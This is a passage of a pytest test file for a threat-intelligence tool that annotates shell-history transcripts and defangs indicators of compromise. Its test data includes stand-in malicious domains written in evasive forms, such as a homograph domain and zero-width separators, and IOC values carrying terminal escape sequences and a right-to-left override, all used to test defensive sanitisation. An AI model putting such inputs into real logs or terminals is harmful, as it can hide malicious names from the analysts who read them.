    # Extension TLDs, IDN TLDs and scheme-less URLs are defanged too.
    transcript = history(parse_text)
    assert apply(transcript, [entry(iocs=[{"type": ioc_type, "value": value}])]) == (1, [])
    assert [(i.type, i.value) for i in transcript.lines[0].gloss.iocs] == [(ioc_type, stored)]


def test_ioc_values_are_sanitized(parse_text):
    transcript = history(parse_text)
    glosses = [entry(iocs=[{"type": "path", "value": "/tmp/a" + LF + "b" + ESC + "[2J" + RLO}])]
    assert apply(transcript, glosses) == (1, [])
    assert transcript.lines[0].gloss.iocs[0].value == "/tmp/a b" + picture(0x1B) + "[2J" + shown(0x202E)


IDN = "".join(chr(c) for c in (0x43F, 0x440, 0x438, 0x43C, 0x435, 0x440))  # Cyrillic letters
IDN_TLD = chr(0x440) + chr(0x444)
# The re-check: one [.] in a host hid the live names before or after it.
IOC_BYPASSES = [
    ("domain", "x[.]y.evil.zip", "x[.]y.evil[.]zip"),
    ("url", "x[.]y.evil.zip/a", "x[.]y.evil[.]zip/a"),
    ("url", "hxxp://x[.]y.evil.zip:8080/a.b", "hxxp://x[.]y.evil[.]zip:8080/a.b"),
    ("domain", "a.evil.zip,b.evil.zip", "a.evil[.]zip,b.evil[.]zip"),
    ("domain", "a.evil.zip" + chr(0x200B) + "b.evil.zip", "a.evil[.]zip" + shown(0x200B) + "b.evil[.]zip"),
    ("domain", "x[.]y.evil.zip.", "x[.]y.evil[.]zip."),
    ("domain", ".evil.zip", ".evil[.]zip"),
    ("url", "hxxp://a.evil.zip@b.evil.zip/", "hxxp://a.evil[.]zip@b.evil[.]zip/"),
    ("domain", IDN + "." + IDN_TLD, IDN + "[.]" + IDN_TLD),
    ("domain", "198.51.100.7", "198.51.100[.]7"),  # defanged once, not twice
    ("domain", "_ldap._tcp.example.com", "_ldap._tcp.example[.]com"),
]


@pytest.mark.parametrize("ioc_type, value, stored", IOC_BYPASSES)
def test_every_name_in_a_typed_ioc_host_is_defanged(parse_text, ioc_type, value, stored):
    transcript = history(parse_text, 2)
    assert apply(transcript, [entry(iocs=[{"type": ioc_type, "value": value}])]) == (1, [])
    assert transcript.lines[0].gloss.iocs[0].value == stored
    # Defanging is idempotent: submitting the stored value again stores it unchanged.
    assert apply(transcript, [entry(n=2, iocs=[{"type": ioc_type, "value": stored}])]) == (1, [])
    assert transcript.lines[1].gloss.iocs[0].value == stored


@pytest.mark.parametrize("ioc_type", ["domain", "url"])
@pytest.mark.parametrize("value", ["evil.zip x.y", "a.evil.zip b.evil.zip", " evil.zip", "evil.zip" + chr(9),
                                   "evil.zip" + LF + "x.y", "a.evil.zip" + chr(0xA0) + "b.evil.zip",
                                   "a.evil.zip" + chr(0x2028) + "b.evil.zip", "a.evil.zip" + chr(0x3000) + "b.zip"])
def test_domain_and_url_iocs_with_whitespace_are_rejected(parse_text, ioc_type, value):
    transcript = history(parse_text)
    _, rejected = apply(transcript, [entry(iocs=[{"type": ioc_type, "value": value}])])
    assert rejected == ["line 1: invalid entry (iocs.0: Value error, a domain or url IOC cannot contain whitespace)"]


def test_other_iocs_may_contain_whitespace(parse_text):
    transcript = history(parse_text)
    assert apply(transcript, [entry(iocs=[{"type": "path", "value": "/tmp/My Documents/a.txt"}])]) == (1, [])


# 10. Small items


@pytest.mark.parametrize("command, by", [("apply-glosses", MODEL), ("annotate", "Diego")])
def test_cli_prints_at_most_100_rejections(cli_paths, capsys, command, by):
    path, glosses = cli_paths
    write_glosses(glosses, [entry(n=1000 + k) for k in range(150)])
    assert cli.main([command, str(path), str(glosses), "--by", by]) == 1
    out, err = capsys.readouterr()
    assert out.rstrip().endswith("; rejected 150")  # the full count
    lines = err.splitlines()
    assert lines[:100] == [f"  rejected: line {1000 + k}: no such line" for k in range(100)]
    assert lines[100:] == ["  ... and 50 more rejections"]


def test_cli_prints_100_rejections_with_no_tail(cli_paths, capsys):
    path, glosses = cli_paths
    write_glosses(glosses, [entry(n=1000 + k) for k in range(100)])
    assert cli.main(["apply-glosses", str(path), str(glosses), "--by", MODEL]) == 1
    lines = capsys.readouterr().err.splitlines()
    assert len(lines) == 100 and lines[-1] == "  rejected: line 1099: no such line"


def test_cli_prints_at_most_100_warnings(tmp_path, monkeypatch, resolver, capsys):
    monkeypatch.setattr("interlinear_cti.verify.CountermapResolver", lambda db=None: resolver)
    hist = tmp_path / ".bash_history"
    hist.write_bytes(b"".join(b"frob%d --x\n" % k for k in range(150)))
    path, glosses = tmp_path / "transcript.json", tmp_path / "glosses.json"
    assert cli.main(["parse", str(hist), "-o", str(path)]) == 0
    write_glosses(glosses, [entry(n=k, techniques=["T1053.004"]) for k in range(1, 151)])
    capsys.readouterr()
    assert cli.main(["apply-glosses", str(path), str(glosses), "--by", MODEL]) == 1
    out, err = capsys.readouterr()
    assert out.startswith("Applied 150 model glosses to ") and out.rstrip().endswith("; rejected 0; 150 warnings")
    lines = err.splitlines()
    assert lines[:100] == [f"  warning: line {k}: T1053.004 is deprecated (accepted)" for k in range(1, 101)]
    assert lines[100:] == ["  ... and 50 more warnings"]


def test_a_glosses_file_with_a_bom_is_read(cli_paths):
    # Windows PowerShell 5.1's Set-Content -Encoding utf8 writes a BOM.
    path, glosses = cli_paths
    glosses.write_bytes(b"\xef\xbb\xbf" + json.dumps([entry(n=2)]).encode("utf-8"))
    assert cli.main(["apply-glosses", str(path), str(glosses), "--by", MODEL]) == 0
    assert load(path).lines[1].gloss.source == "model"


@pytest.mark.parametrize("command, by", [("apply-glosses", MODEL), ("annotate", "Diego")])
def test_dataset_versions_are_recorded_when_missing(cli_paths, command, by):
    # A transcript glossed only through apply-glosses or annotate still records the dataset versions.
    path, glosses = cli_paths
    write_glosses(glosses, [entry(n=2)])
    assert load(path).datasets == {}
    assert cli.main([command, str(path), str(glosses), "--by", by]) == 0
    assert load(path).datasets == {"attack-enterprise": "20.0"}


def test_dataset_versions_already_recorded_are_kept(cli_paths):
    path, glosses = cli_paths
    transcript = load(path)
    transcript.datasets = {"attack-enterprise": "19.0"}
    save(transcript, path)
    write_glosses(glosses, [entry(n=2)])
    assert cli.main(["annotate", str(path), str(glosses), "--by", "Diego"]) == 0
    assert load(path).datasets == {"attack-enterprise": "19.0"}


@pytest.mark.parametrize("source, by", [("model", MODEL), ("analyst", "Diego")])
def test_a_repeated_n_is_rejected(parse_text, library, source, by):
    # Only the first entry for a line is used; a second one must not push the first into history.
    transcript = parse_text(".bash_history", "whoami\n")
    if source == "analyst":
        apply_rules(transcript, library, at=AT)
    glosses = [entry(meaning="First.", techniques=["T1033"]), entry(meaning="Second.", techniques=["T1033"])]
    assert apply(transcript, glosses, source=source, by=by) == (
        1, ["line 1: a repeated line number; only the first entry for a line is used"])
    line = transcript.lines[0]
    assert line.gloss.meaning == "First."
    assert [g.source for g in line.history] == (["rule"] if source == "analyst" else [])


def test_a_repeated_n_is_rejected_even_after_an_invalid_first_entry(parse_text):
    transcript = history(parse_text)
    glosses = [entry(confidence="certain"), entry()]
    _, rejected = apply(transcript, glosses)
    assert rejected == ["line 1: invalid entry (confidence: Input should be 'high', 'medium' or 'low')",
                        "line 1: a repeated line number; only the first entry for a line is used"]


@pytest.mark.parametrize("context", ["yes", "true", 1, 0, None])
def test_context_must_be_a_strict_bool(parse_text, context):
    transcript = history(parse_text)
    _, rejected = apply(transcript, [entry(techniques=[], context=context)])
    assert rejected == ["line 1: invalid entry (context: Input should be a valid boolean)"]
